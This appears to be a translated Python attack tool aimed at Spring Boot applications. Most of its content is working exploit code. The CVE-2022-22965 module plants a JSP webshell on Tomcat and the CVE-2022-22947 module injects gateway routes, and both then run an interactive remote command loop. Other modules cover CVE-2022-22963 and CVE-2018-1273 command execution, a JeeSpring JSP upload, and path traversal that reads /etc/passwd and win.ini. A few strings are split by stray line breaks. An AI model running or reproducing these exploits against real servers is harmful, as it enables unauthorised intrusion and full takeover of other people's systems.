Here's the translated version of your provided Python script into English:

```python
#!/usr/bin/env python
# coding=utf-8
  ################
 #   AabyssZG   #
################

import requests, sys, json, re, random, base64
from termcolor import cprint
from time import sleep
import urllib3
urllib3.disable_warnings()

ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]

def JSON_handle(header1, header2):
    dict1 = json.loads(str(header1).replace("'", "\""))
    dict2 = json.loads(str(header2).replace("'", "\""))
    # Merge two dictionaries
    merged_dict = {**dict1, **dict2}
    # Convert the merged dictionary to a JSON string
    result_json = json.dumps(merged_dict, indent=2)
    return result_json

def CVE_2022_22965(url, proxies, header_new):
    cprint("====== Starting CVE-2022-22965 exploitation on target URL ======", "green")
    oldHeaders_1 = {
        "User-Agent": random.choice(ua),
        "prefix": "<%",
        "suffix": "%>//",
        "c": "Runtime",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
    }
    oldHeaders_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
    }
    Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
    Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_other = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    getpayload = url + payload_http
    try:
        requests.packages.urllib3.disable_warnings()
        requests.post(url, headers=Headers_2, data=file_date_data, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        requests.post(url, headers=Headers_2, data=payload_other, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        requests.post(url, headers=Headers_1, data=payload_linux, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.post(url, headers=Headers_1, data=payload_win, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        test = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        test_again = requests.get(url + "shell.jsp

", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if test_again.status_code == 200:
            cprint("[+] CVE-2022-22965 RCE vulnerability exists, Webshell uploaded at: " + url + "shell.jsp?pwd=tomcat&cmd=whoami", "red")
            while True:
                Cmd = input("[+] Please enter the command to execute>>> ")
                if Cmd == "exit":
                    sys.exit(0)
                url_shell = url + "shell.jsp?pwd=tomcat&cmd={}".format(Cmd)
                r = requests.get(url_shell, verify=False, proxies=proxies)
                r_again = requests.get(url_shell, verify=False, proxies=proxies)
                if r_again.status_code == 500:
                    cprint("[-] Resent packet returned status code 500, please try to use WebShell manually: shell.jsp?pwd=tomcat&cmd=whoami\n", "yellow")
                    break
                else:
                    resp = r_again.text
                    result = re.findall('([^\x00]+)\n', resp)[0]
                    cprint(result, "green")
        else:
            cprint("[-] CVE-2022-22965 vulnerability does not exist or has already been exploited, please try accessing the shell address manually:\n[/shell.jsp?pwd=tomcat&cmd=command] \n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def CVE_2022_22963(url, proxies, header_new):
    cprint("====== Starting CVE-2022-22963 exploitation on target URL ======", "green")
    header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'}
    data = 'test'
    oldHeader = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = 'functionRouter'
    headernew = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
    header.update(headernew)
    try:
        url = url + path
        requests.packages.urllib3.disable_warnings()
        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
        code = req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'
        if (code == 500) and (rsp in text):
            cprint(f'[+] {url} is vulnerable to CVE-2022-22963 RCE, please manually create a reverse shell\n', "red")
        else:
            cprint("[-] CVE-2022-22963 vulnerability does not exist\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def CVE_2022_22947(url, proxies, header_new):
    cprint("====== Starting CVE-2022-22947 exploitation on target URL ======", "green")
    oldHeader_1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/json'
    }
    oldHeader_2 = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    headers1 = json.loads(str(JSON_handle(oldHeader_1, header_new)).replace("'", "\""))
    headers2 = json.loads(str(JSON_handle(oldHeader_2, header_new)).replace("'", "\""))
    payload = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    payload2 = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, timeout=10, verify=False, proxies=proxies)
        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10, verify=False, proxies=proxies)
        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10, verify=False, proxies=proxies)
        if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
            cprint("[+] Payload has been executed, the result is as follows:", "red")
            print('\n')
            print(re3.text)
            print('\n')
            print("[+] Command execution module (type 'exit' to exit)")
            while True:
                Cmd = input("[+] Please enter the command to execute>>> ")
                if Cmd == "exit":
                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10, verify=False, proxies=proxies)
                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10, verify=False, proxies=proxies)
                    sys.exit(0)
                else:
                    payload3 = payload2.replace('whoami', Cmd)
                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, timeout=10, json=json, verify=False, proxies=proxies)
                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10, verify=False, proxies=proxies)
                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10, verify=False, proxies=proxies)
                    result = re3.text
                    cprint(result, "green")
                    print('\n')
        else:
            cprint("[-] CVE-2022-22947 vulnerability does not exist\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def JeeSpring_2023(url, proxies, header_new):
    cprint("====== Starting 2023 JeeSpring arbitrary file upload vulnerability exploitation on target URL ======", "green")
    oldHeader = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
        'Connection': 'close'
    }
    headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
    payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnR

sbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
    payload = base64.b64decode(payload2)
    path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'

    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + path, data=payload, headers=headers1, verify=False, proxies=proxies)
        code1 = re1.status_code
        if ('jsp' in str(re1.text)) and (int(code1) == 200):
            cprint("[+] Payload has been sent, successfully uploaded JSP", "red")
            newpath = str(re1.text)
            urltest = url + "static/uploadify/" + newpath.strip()
            retest = requests.get(url=urltest, verify=False, proxies=proxies)
            code2 = retest.status_code
            if ('Hello' in str(retest.text)) and (code2 == 200):
                cprint(f'[+] {url} is vulnerable to 2023 JeeSpring arbitrary file upload vulnerability, Poc URL is as follows:', "red")
                cprint(urltest + '\n', "red")
            else:
                cprint(f'[.] Poc not found, please verify manually: {urltest}', "yellow")
        else:
            cprint("[-] 2023 JeeSpring arbitrary file upload vulnerability does not exist\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def JolokiaRCE(url, proxies, header_new):
    cprint("====== Starting Jolokia series RCE vulnerability testing on target URL ======", "green")
    path1 = 'jolokia'
    path2 = 'actuator/jolokia'
    path3 = 'jolokia/list'
    oldHeader = {"User-Agent": random.choice(ua)}
    headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + path1, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
        code1 = re1.status_code
        re2 = requests.post(url=url + path2, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
        code2 = re2.status_code
        if ((int(code1) == 200) or (int(code2) == 200)):
            cprint("[+] Found Jolokia related path with status code 200, further verification required", "red")
            retest = requests.get(url=url + path3, timeout=10, verify=False, proxies=proxies)
            code3 = retest.status_code
            if ('reloadByURL' in str(retest.text)) and (code3 == 200):
                cprint(f'[+] {url} is vulnerable to Jolokia-Logback-JNDI-RCE, Poc URL is as follows:', "red")
                cprint(url + path3 + '\n', "red")
            elif ('createJNDIRealm' in str(retest.text)) and (code3 == 200):
                cprint(f'[+] {url} is vulnerable to Jolokia-Realm-JNDI-RCE, Poc URL is as follows:', "red")
                cprint(url + path3 + '\n', "red")
            else:
                cprint(f'[.] Jolokia/list path does not contain the keywords, please verify manually:', "yellow")
                cprint(url + path3 + '\n', "red")
        else:
            cprint("[-] Jolokia series RCE vulnerabilities do not exist\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def CVE_2021_21234(url,proxies, header_new):
    cprint("====== Starting CVE-2021-21234 vulnerability testing on target URL ======", "green")
    payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    oldHeader = {"User-Agent": random.choice(ua)}
    headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + payload1, headers=headers1, timeout=10, verify=False, proxies=proxies)
        re2 = requests.post(url=url + payload2, headers=headers1, timeout=10, verify=False, proxies=proxies)
        re3 = requests.post(url=url + payload3, headers=headers1, timeout=10, verify=False, proxies=proxies)
        re4 = requests.post(url=url + payload4, headers=headers1, timeout=10, verify=False, proxies=proxies)
        if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
            cprint("[+] Found Spring Boot directory traversal vulnerability and the system is Win, Poc paths are as follows:", "red")
            cprint(url + payload1, "red")
            cprint(url + payload2 + '\n', "red")
        elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
            cprint(f'[+] Found Spring Boot directory traversal vulnerability and the system is Linux, Poc paths are as follows:', "red")
            cprint(url + payload3, "red")
            cprint(url + payload4 + '\n', "red")
        else:
            cprint("[-] No Spring Boot directory traversal vulnerability found\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def SnakeYAML_RCE(url, proxies, header_new):
    cprint("====== Starting SnakeYAML RCE vulnerability testing on target URL ======", "green")
    oldHeaders_1 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    oldHeaders_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/json"
        }
    payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
    payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
    path = 'env'
    Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
    Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
    try:
        requests.packages.urllib3.disable_warnings()
        urltest = url + path
        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if ('example.yml' in str(re1.text)):
            cprint("[+] Found SnakeYAML-RCE vulnerability, Poc for Spring 1.x:", "red")
            cprint('Vulnerability path is ' + urltest + '\n', "red")
            cprint('POST data content is ' + payload_1 + '\n', "red")
        elif ('example.yml' in str(re2.text)):
            cprint("[+] Found SnakeYAML-RCE vulnerability, Poc for Spring 2.x:", "red")
            cprint('Vulnerability path is ' + urltest + '\n', "red")
            cprint('POST data content is ' + payload_2 + '\n', "red")
        else:
            cprint("[-] No SnakeYAML-RCE vulnerability found\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def Eureka_xstream_RCE(url, proxies, header_new):
    cprint("====== Starting Eureka_Xstream deserialization vulnerability testing on target URL ======", "green")
    oldHeaders_1 = {
        "User

-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    oldHeaders_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/json"
        }
    Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
    Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
    payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
    payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
    path1 = 'env'
    path2 = 'actuator/env'
    try:
        requests.packages.urllib3.disable_warnings()
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if ('127.0.0.2' in str(re1.text)):
            cprint("[+] Found Eureka_Xstream deserialization vulnerability, Poc for Spring 1.x:", "red")
            cprint('Vulnerability path is ' + urltest1 + '\n', "red")
            cprint('POST data content is ' + payload_1 + '\n', "red")
        elif ('127.0.0.2' in str(re2.text)):
            cprint("[+] Found Eureka_Xstream deserialization vulnerability, Poc for Spring 2.x:", "red")
            cprint('Vulnerability path is ' + urltest2 + '\n', "red")
            cprint('POST data content is ' + payload_2 + '\n', "red")
        else:
            cprint("[-] No Eureka_Xstream deserialization vulnerability found\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def CVE_2018_1273(url, proxies, header_new):
    cprint("====== Starting Spring_Data_Commons RCE vulnerability testing on target URL ======", "green")
    oldHeaders = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    Headers = json.loads(str(JSON_handle(oldHeaders, header_new)).replace("'", "\""))
    path1 = 'users'
    path2 = 'users?page=0&size=5'
    payload1 = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
    payload2 = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('whoami')\")]=asdf"
    try:
        requests.packages.urllib3.disable_warnings()
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.get(url=urltest1, headers=Headers, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        code1 = re1.status_code
        if ((int(code1) == 200) and ('Users' in str(re1.text))):
            cprint("[+] Found Spring_Data_Commons RCE vulnerability:", "red")
            cprint('Vulnerability path is ' + urltest1 + '\n', "red")
            print("[+] Command execution module (type 'exit' to exit)")
            choose = input("[+] There are two Payloads, please enter 1 or 2>>> ")
            while True:
                Cmd = input("[+] Please enter the command to execute>>> ")
                if (choose == '1'):
                    payload3 = payload1.replace('whoami', Cmd)
                else:
                    payload3 = payload2.replace('whoami', Cmd)
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    re2 = requests.post(url=urltest2, data=payload3, headers=Headers, timeout=10, verify=False, proxies=proxies)
                    code2 = re2.status_code
                    if (int(code2) != 503):
                        cprint('[+] The Payload has been executed, as this vulnerability has no output, please use Dnslog for testing\n', "red")
        else:
            cprint("[-] No Spring_Data_Commons RCE vulnerability found\n", "yellow")
    except KeyboardInterrupt:
        print("Process manually terminated with Ctrl + C")
        sys.exit()
    except Exception as e:
        print("[-] An error occurred, logged in error.log\n")
        with open("error.log", "a") as f2:
            f2.write(str(e) + '\n')

def vul(url, proxies, header_new):
    functions = {
        1: JeeSpring_2023,
        2: CVE_2022_22947,
        3: CVE_2022_22963,
        4: CVE_2022_22965,
        5: CVE_2021_21234,
        6: SnakeYAML_RCE,
        7: Eureka_xstream_RCE,
        8: JolokiaRCE,
        9: CVE_2018_1273,
    }
    cprint("[+] Current vulnerability library content:", "green")
    for num, func in functions.items():
        print(f" {num}: {func.__name__}")
    try:
        choices = input("\nPlease enter the vulnerabilities to check (e.g., 1,3,5 or press Enter to check all): ")
        if choices == '':
            choices = "1,2,3,4,5,6,7,8,9"
        choices = [int(choice) for choice in choices.split(',')]
    except Exception as e:
        print("Please do not enter meaningless strings")
        sys.exit()
    for choice in choices:
        selected_func = functions.get(choice)
        if selected_func:
            selected_func(url, proxies, header_new)
        else:
            print(f"{choice} Input error, please re-enter the vulnerability selection module\n")
            break
    cprint("More vulnerability exploitation modules will be added later, please stay tuned~", "red")
    sys.exit()
```
